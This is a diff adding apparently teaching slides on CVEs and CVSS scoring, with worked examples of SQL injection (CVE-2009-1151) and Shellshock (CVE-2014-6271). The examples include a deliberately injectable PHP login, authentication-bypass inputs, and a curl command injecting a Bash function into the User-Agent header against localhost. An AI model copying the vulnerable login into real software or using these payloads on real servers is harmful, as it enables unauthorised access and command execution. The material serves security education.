@@ -130,4 +130,126 @@ h1 { view-transition-name: header2; }
 
 ## Common Vulnerability Scoring System (CVSS) 
 
-The CVSS produces a numerical score to represent the severity of a vulnerability. The numerical score can then be translated into a qualitative representation (such as low, medium, high, and critical) to help organizations properly assess and prioritize their vulnerability management processes. Learn more about the latest CVSS version 4.0 on thecd ../
+The CVSS produces a numerical score to represent the severity of a vulnerability. The numerical score can then be translated into a qualitative representation (such as low, medium, high, and critical) to help organizations properly assess and prioritize their vulnerability management processes. Learn more about the latest CVSS version 4.0 on the ../
+
+
+---
+
+## Find some CVEs...
+
+
+- Identify familiar products (e.g. Windows, Apache, Android) and explore if they’ve had CVEs in the past.
+
+  - find a CVSS score, exploitability, patch, and impact.
+
+- Why might public vulnerability databases matter in modern software development?
+
+---
+
+## Use the CVE Scoring System Calculator
+
+- ![https://www.first.org/cvss/calculator/4-0](https://www.first.org/cvss/calculator/4-0)
+
+
+---
+
+## Basics on SQL
+
+...
+
+---
+
+## CVE-2009-1151 [SQL Injection]
+
+Conisder: 
+
+<div class="columns-2">
+<div style="padding-left: 100px; font-size:30px">
+
+```php
+<?php
+$conn = new mysqli("localhost", "root", "root", "demo");
+
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $user = $_POST["username"];
+    $pass = $_POST["password"];
+    $sql = "SELECT * FROM users WHERE username='$user' AND password='$pass'";
+    $result = $conn->query($sql);
+
+    if ($result->num_rows > 0) {
+        echo "Login successful!";
+    } else {
+        echo "Login failed!";
+    }
+}
+?>
+
+<form method="post">
+    Username: <input name="username"><br>
+    Password: <input name="password" type="password"><br>
+    <button type="submit">Login</button>
+</form>
+```
+
+<div  class="columns-2" style="font-size:26px">
+<div>
+
+Example inputs: 
+
+- Username: `admin' --`
+- Password: `' --`
+
+</div>
+<div style="">
+
+Or:
+
+- Username: `admin` 
+- Password: `' OR '1'='1'`
+
+</div>
+</div>
+
+
+</div>
+<div style="padding-top:30px;">
+
+![](../../figures/SQL_CVE.png)
+
+</div>
+</div>
+
+---
+
+## CVE-2014-6271 [Shellshock]
+
+Consider:
+
+<div style="padding-top: 80px;"class="columns-2">
+<div style="padding-left: 80px; font-size:28px;">
+
+```bash
+#!/bin/bash
+echo "Content-type: text/plain"
+echo
+
+echo "Vulnerable CGI script. Your User-Agent is:"
+echo "$HTTP_USER_AGENT"
+```
+
+> This CGI script reflects the `User-Agent` header, but Bash in older versions executes function-like input such as `() { :; };`.
+
+### Exploit example:
+
+```bash
+curl -H "User-Agent: () { :; }; /bin/bash -c 'id'" \
+  http://localhost:8080/cgi-bin/status
+```
+
+</div>
+<div style="padding-top: 30px;">
+
+![](../../figures/shellshock-cve.png)
+
+</div>
+</div>
